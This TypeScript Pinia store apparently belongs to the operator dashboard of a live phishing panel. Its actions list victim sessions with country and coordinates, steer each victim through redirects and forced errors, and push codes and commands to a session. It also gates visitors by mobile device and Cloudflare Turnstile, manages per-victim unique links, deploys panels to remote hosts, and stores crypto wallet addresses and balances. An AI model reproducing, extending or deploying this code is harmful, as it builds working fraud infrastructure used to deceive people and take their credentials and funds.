import { defineStore, mapActions } from "pinia";
import { useUserStore } from '@/stores/userStore'

type SettingsProps={
  CFSiteKey:string
  CFSiteSecret:string
  Mobile_Only:boolean
  Enable_Captcha:boolean
  Enable_Turnstile:boolean
  Redirect_All:number
}

type Settings={
  [P in keyof SettingsProps as string]: SettingsProps[P]
}
interface SessionOption{
  pagefile:string
  tokenButtonType:string
  tokenButtonName:string
  SendTokenWithError:string
  tokenName:string
  isMainRow:boolean
  order:number
}
interface Session{
  SessionID:string
  panelID:string
  nodeId:string
  nodeName:string
  MainField:string
  Last_Online:number
  Next_Redirect:string|null
  memo:String
  options:SessionOption[]
  lat:String,
  lon:String,
  country:String,
}
interface Panel{ 
  panelId:string
  panelType?:string
  nodeID:string
  settings:Settings
  access:string
  expires:Date
  NodeName:string
}

interface PanelSelection{ 
  panelId:string
  nodeID?:string
  NodeName:string
}
interface SessionListResponse{
  status:string,
  sessions:Session[]
}

interface SessionMap{
  [key: string]: Session
}

interface Link{
  linkId:string,
  data:string,
}
interface LinkListResponse{
  status:string,
  uniqueLinks?:Link[]
}

interface PanelDataResponse{
  status:string,
  data?:any
}

interface SuccessResponse{
  status:string,
}
interface CreateLinkResponse{
  status:string,
  uniqueLink:Link
}
interface SessionState{
  panels:Panel[],
  selectedPanel:PanelSelection|null,
  sessions:Session[],
  selectedSessions:Session[],
  selectedPanelName:string
  pageResults:Session[],
  currentSession:Session | null,
  scriptOutput:string,
  updateIntervalIds:any[],
  currentFilter:string | null,
  cancelSessionReload:boolean
  uniqueLinks:Link[]
}

const SERVER = ""
export const useSessionStore = defineStore('sessionStore',{
  state: () : SessionState => {
    return {
      panels:[],
      selectedPanel:null,
      sessions:[],
      selectedSessions:[],
      selectedPanelName:"none",
      pageResults:[],
      currentSession:null,
      scriptOutput:"",
      updateIntervalIds:[],
      currentFilter:null,
      cancelSessionReload:false,
      uniqueLinks:[]
    }
  },
  actions:{
    async stopUpdates(){
      this.cancelSessionReload=true;
      for(let interval of this.updateIntervalIds){
        clearInterval(interval)
      }
      this.updateIntervalIds=[]
    },
    async clearSession(){
      this.currentSession=null;
    },
    async clearSessions(){
      this.sessions=[],
      this.selectedSessions=[]
      this.pageResults=[]
    },
    async setFilter(filter:string){
      if(this.selectedPanel || this.selectedPanelName){
        this.currentFilter=filter
        this.stopUpdates();
        this.clearSessions()
        if(this.selectedPanelName=="ALL"){
          this.getAllPanelSessions(true,filter)
        }
        else{
          if(this.selectedPanel){
            this.getSessionList(this.selectedPanel.panelId,this.selectedPanel.NodeName,false,false,filter)
          }
        }        
      }
    },
    async getPanelList(getSessions:boolean,selectDefault:boolean){
      const userStore = useUserStore();
      let options:any={
        credentials: 'include'
      }
      try{
        let response=await fetch(SERVER+'/portal/panelList.php',options);
        if(response.ok){
          let responseData=await response.json()
          if(responseData.status=="ok"){
            this.panels=responseData.panels
            if(responseData.panels && selectDefault){
              let panel=responseData.panels[0];
              this.selectedPanelName=panel.panelId+"@"+panel.nodeID
              this.selectedPanel=panel
              if(getSessions){
                this.getSessionList(panel.panelId,panel.nodeID,false,false,null)
              }
            }
          }
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async getPanelSettings(panelId:string,nodeId:string){
      const userStore = useUserStore();
      let options:any={
        credentials: 'include'
      }
      try{
        let response=await fetch(SERVER+`/portal/panelSettings.php?panelId=${panelId}&nodeId=${nodeId}`,options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async getPanelFMCreds(panelId:string,nodeId:string){
      const userStore = useUserStore();
      let options:any={
        credentials: 'include'
      }
      try{
        let response=await fetch(SERVER+`/portal/panelFMCreds.php?panelId=${panelId}&nodeId=${nodeId}`,options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async getPanelAccessList(panelId:string){
      const userStore = useUserStore();
      let options:any={
        credentials: 'include'
      }
      try{
        let response=await fetch(SERVER+`/portal/panelAccessList.php?panelId=${panelId}`,options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    
    async getAllPanelSessions(panelChange:boolean,filter:string){
      this.selectedPanel=null;
      for(let i=0;i<this.panels.length;i++){
        let panel = this.panels[i]
        let mergeNext = (i != 0 || !panelChange) ? true : false
        this.getSessionList(panel.panelId,panel.NodeName,mergeNext,false,filter)
      }
    },
    async getSessionList(panelId:string,nodeName:string,merge:boolean,isUpdate:boolean,filter:string|null){
      const userStore = useUserStore();
      if(!merge){
        this.sessions=[]
        this.selectedSessions=[]
        this.pageResults=[]
      }
      if(!isUpdate){
        let sessionListUpdateInterval=setInterval(()=>{
          this.getSessionList(panelId,nodeName,true,true,filter)
        },1500);
        this.updateIntervalIds.push(sessionListUpdateInterval);
      }
      let options:any={
        credentials: 'include'
      }
      try{
        let url=`${SERVER}/portal/sessions.php?panelId=${panelId}&nodeName=${nodeName}`;
        if(filter){
          url+=`&filter=${filter}`;
        }
        let response=await fetch(url,options);
        if(response.ok){
          let responseData:SessionListResponse=await response.json()
          if(responseData.status=="ok"){
            let combinedSessions:Session[] = []
            let newSessionsDetected  = false
            responseData.sessions = responseData.sessions.map(session => {
              session.nodeName=nodeName
              session.memo= session.memo ? session.memo : "";
              return session 
            })
            if(!merge){
              combinedSessions = responseData.sessions;
              combinedSessions = combinedSessions.map(item =>{
                item.panelID = panelId;
                return item
              });
            }
            else{
              let existingSessions:SessionMap = {}
              for(let item of this.sessions){
                existingSessions[item.SessionID] = item;
              }
              let newSessions=[];
              for(let item of responseData.sessions){
                if(existingSessions[item.SessionID]){
                  if(item.Last_Online==existingSessions[item.SessionID].Last_Online){
                    item.Last_Online-=1;
                  }
                  Object.assign(existingSessions[item.SessionID],item);
                }
                else{
                  newSessions.push(item)
                }
              }
              newSessions=newSessions.map(item =>{
                item.panelID = panelId;
                return item
              });
              if(newSessions.length>0){
                newSessionsDetected = true
              }
              combinedSessions = newSessions.concat(this.sessions);
            }
            let sortedSessions=combinedSessions;
            this.sessions=sortedSessions;
            this.selectedSessions=sortedSessions;
            
            if(!isUpdate || (isUpdate && newSessionsDetected)) {
              this.pageResults=sortedSessions.slice(0,50);
            }
          }
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
        
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
      
    },
    async refreshSession(sessionId:string,panelId:string,nodeId:string,interval:number){
      let intervalId=setTimeout(async ()=>{
        if(this.cancelSessionReload){
            this.cancelSessionReload=false;
            return;
        }
        await this.getSession(sessionId,panelId,nodeId)
        this.refreshSession(sessionId,panelId,nodeId,interval)
      },interval)
      this.updateIntervalIds.push(intervalId)
    },
    async searchSession(sessionId:string){
      let interval=1500
      let panelsRes=await this.getPanelList(false,false);
      if(panelsRes.error){
        return panelsRes.error
      }
      for(let panel of panelsRes.panels){
        let sessionRes=await this.getSession(sessionId,panel.panelId,panel.nodeID)
        if(!sessionRes.error){
          if(sessionRes.session){
            this.cancelSessionReload=false;
            this.getSession(sessionId,panel.panelId,panel.nodeID);
            this.refreshSession(sessionId,panel.panelId,panel.nodeID,interval)
            return sessionRes;
          }
        }
      }
      return {
        error:"NOT_FOUND",
        message:"Session not found"
      }
    },
    async getSession(sessionId:string,panelId:string,nodeId:string){
      const userStore = useUserStore();
      let options:any={
        credentials: 'include'
      }
      try{
        let response=await fetch(SERVER+`/portal/session.php?sessionId=${sessionId}&panelId=${panelId}&nodeId=${nodeId}`,options);
        if(response.ok){
          let responseData=await response.json()
          if(responseData.status=="ok"){
            let session=responseData.session;
            if(session){
              for(let key of Object.keys(session)){
                if(session[key] && typeof session[key] == "string" && session[key].toLowerCase()=="null"){
                  session[key]=null
                }
              }
            }
            this.currentSession=session;
            if(this.currentSession){
              this.currentSession.nodeId=nodeId;
            }
          }
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async updateRedirect(newRedirect:string,setError:boolean,test:boolean){
      const userStore = useUserStore();
      if(this.currentSession){
        let data=new FormData();
      if(test){
        data.append('sessionId',"testsession");
      }
      else{
        data.append('sessionId',this.currentSession.SessionID);
      }
      if(!test){
        data.append('sessionId',this.currentSession.SessionID);
        data.append('panelId',this.currentSession.panelID);
        data.append('nodeId',this.currentSession.nodeId);
      }
      data.append('newRedirect',newRedirect);
      if(setError){
        data.append('seterror',"1");
      }
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/updateRedirect.php',options);
        if(response.ok){
          let responseData=await response.json()
          if(!test){
            if(responseData.Next_Redirect=="null"){
              this.currentSession.Next_Redirect=null
            }
            else{
              this.currentSession.Next_Redirect=responseData.Next_Redirect;
            }
          }
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
      }
      
    },
    async savePanelSettings(panelId:string,nodeId:string,settings:Settings){
      const userStore = useUserStore();
      let data=new FormData();
      let fields=["Mobile_Only","Enable_Captcha","Enable_Turnstile","Enable_Panel_ChatId","ChatId","Redirect_All","CFSiteKey","CFSiteSecret"];
      data.append('panelId',panelId);
      data.append('nodeId',nodeId);
      for(let field of fields){
        if(field in settings){
          let value = settings[field];
          if(typeof value == "boolean"){
            value = value ? "1" : "0" 
          }
          data.append(field,settings[field].toString())
        }
      }
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/savePanelSettings.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    
    async sendData(newData:any,newRedirect:string,sendError:boolean,test:boolean){
      const userStore = useUserStore();
      if(!this.currentSession){
        return
      }
      let data=new FormData();
      if(!test){
        data.append('sessionId',this.currentSession.SessionID);
      }
      else{
        data.append('sessionId',"testsession");
      }
      if(!test){
        data.append('panelId',this.currentSession.panelID);
        data.append('nodeId',this.currentSession.nodeId);
      }
      data.append('newRedirect',newRedirect);
      for(let field in newData){
        data.append("sentcode"+field,newData[field]);
      }
      if(sendError){
        data.append("seterror","1");
      }
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data  
      }
      try{
        let response=await fetch(SERVER+'/portal/sendData.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async sessionCmd(cmd:string,test:boolean){
      const userStore = useUserStore();
      if(!this.currentSession || !cmd){
        return
      }
      let data=new FormData();
      if(!test){
        data.append('sessionId',this.currentSession.SessionID);
      }
      else{
        data.append('sessionId',"testsession");
      }
      if(!test){
        data.append('panelId',this.currentSession.panelID);
        data.append('nodeId',this.currentSession.nodeId);
      }
      data.append("cmd",cmd);
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data  
      }
      try{
        let response=await fetch(SERVER+'/portal/sessionCmd.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error running the command , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async bookmarkSession(session:Session,bookmarked:boolean){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',session.panelID);
      let node=this.panels.find(panel => session.panelID == panel.panelId)
      if(!node){
        return false;
      }
      data.append('nodeId',node.nodeID);
      data.append('sessionId',session.SessionID);
      data.append('bookmarked',bookmarked.toString());
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/bookmarkSession.php',options);
        if(response.ok){
          let responseData=await response.json()
          if(this.currentFilter == "bookmarked" && !bookmarked){
            this.removeSessionFromMemory(session)
          }
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async removeSessionFromMemory(session:Session){
      let index=this.sessions.indexOf(session);
      if (index > -1) {
        this.sessions.splice(index, 1);
      }
      index=this.selectedSessions.indexOf(session);
      if (index > -1) {
        this.selectedSessions.splice(index, 1);
      }
      index=this.pageResults.indexOf(session);
      if (index > -1) {
        this.pageResults.splice(index, 1);
      }
    },
    async deleteSession(session:Session){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',session.panelID);
      let node=this.panels.find(panel => session.panelID == panel.panelId)
      if(!node){
        return false;
      }
      data.append('nodeId',node.nodeID);
      data.append('sessionId',session.SessionID);
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/deleteSession.php',options);
        if(response.ok){
          let responseData=await response.json()
          this.removeSessionFromMemory(session);
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async updateMemo(session:Session,memo:string){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',session.panelID);
      let node=this.panels.find(panel => session.panelID == panel.panelId)
      if(!node){
        return false;
      }
      data.append('nodeId',node.nodeID);
      data.append('sessionId',session.SessionID);
      data.append('memo',memo);
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/updateMemo.php',options);
        if(response.ok){
          let responseData=await response.json()
          session.memo=memo;
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async addPanelUser(panelId:string,username:string,password:string,access:string){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',panelId);
      data.append('username',username);
      data.append('password',password);
      data.append('access',access)
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/addPanelUser.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async editPanelUser(panelId:string,username:string,password:string,access:string){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',panelId);
      data.append('username',username);
      data.append('password',password);
      data.append('access',access)
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/editPanelUser.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async removePanelUser(panelId:string,username:string,password:string){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',panelId);
      data.append('username',username);
      data.append('password',password);
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/removePanelUser.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    async hostPanel(panelId:string,nodeName:string,host:string,user:string,password:string){
      this.scriptOutput="";
      var xhr = new XMLHttpRequest();
      var url = SERVER+'/portal/hostPanel.php'
      let formData=new FormData();
      xhr.open("POST", url, true);  
      let last_index=0;
      let onProgress  = function(){
        let curr_index = xhr.responseText.length;
        if (last_index == curr_index) return; 
        let newData = xhr.responseText.substring(last_index, curr_index);
        this.scriptOutput += newData.replace(/(<([^>]+)>)/gi, "");
        last_index = curr_index;
      };
      onProgress = onProgress.bind(this);
      xhr.onprogress = onProgress;
      xhr.withCredentials = true;
      formData.append("host",host);
      formData.append("username",user);
      formData.append("password",password);
      formData.append("nodeName",nodeName);
      formData.append("panelId",panelId);
      xhr.send(formData);
    },
    
    async getUniqueLinks(panelId:string,nodeId:string){
      const userStore = useUserStore();
      let options:any={
        credentials: 'include'
      }
      try{
        let response=await fetch(SERVER+`/portal/uniqueLinks.php?panelId=${panelId}&nodeId=${nodeId}`,options);
        if(response.ok){
          let responseData=await response.json()
          return responseData as LinkListResponse;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    
    async getPanelData(panelId:string,nodeId:string){
      const userStore = useUserStore();
      let options:any={
        credentials: 'include'
      }
      try{
        let response=await fetch(SERVER+`/portal/panelData.php?panelId=${panelId}&nodeId=${nodeId}`,options);
        if(response.ok){
          let responseData=await response.json()
          return responseData as PanelDataResponse;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error loading your info , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    
    async saveUniqueLink(panelId:string,nodeName:string,linkId:string,linkData:string){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',panelId);
      data.append('nodeName',nodeName);
      data.append('linkId',linkId);
      data.append('data',linkData);
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/editUniqueLink.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error saving the data , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    
    async deleteUniqueLink(panelId:string,nodeName:string,linkId:string){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',panelId);
      data.append('nodeName',nodeName);
      data.append('linkId',linkId);
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/deleteUniqueLink.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error saving the data , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    
    async addUniqueLink(panelId:string,nodeName:string,linkData:string,field:string){
      const userStore = useUserStore();
      let data=new FormData();
      data.append('panelId',panelId);
      data.append('nodeName',nodeName);
      data.append('field',field);
      data.append('data',linkData);
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/addUniqueLink.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error saving the data , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    
    async saveWalletToken(panelId:string,nodeName:string,tokenId:string,addr:string,bal:string){
      const userStore = useUserStore();
      let data=new FormData();
      let addrkey=`vault_${tokenId}_addr`;
      let balkey=`vault_${tokenId}_bal`;
      data.append('panelId',panelId);
      data.append('nodeName',nodeName);
      //data.append('tokenId',tokenId)
      data.append(addrkey,addr);
      data.append(balkey,bal);
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/savePanelData.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error saving the data , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
    
    async deleteWalletToken(panelId:string,nodeName:string,tokenId:string){
      const userStore = useUserStore();
      let data=new FormData();
      let addrkey=`vault_${tokenId}_addr`;
      let balkey=`vault_${tokenId}_bal`;
      data.append('panelId',panelId);
      data.append('nodeName',nodeName);
      //data.append('tokenId',tokenId)
      data.append(addrkey,"");
      data.append(balkey,"");
      let options:any={
        credentials: 'include',
        method:"POST",
        body: data
      }
      try{
        let response=await fetch(SERVER+'/portal/deletePanelData.php',options);
        if(response.ok){
          let responseData=await response.json()
          return responseData;
        }
        else{
          if(response.status==401){
            userStore.authenticated=false;
            return {
              error:"NOT_AUTHENTICATED",
              message:"Your session expired, login again"
            }
          }
          return {
            error:"SERVER_ERROR",
            message:"There was a error saving the data , try again later"
          }
        }
      }
      catch(err){
        console.error(err);
        return {
          error:"SERVER_ERROR",
          message:"There was a error processing your request , try again later"
        }
      }
    },
  }
});
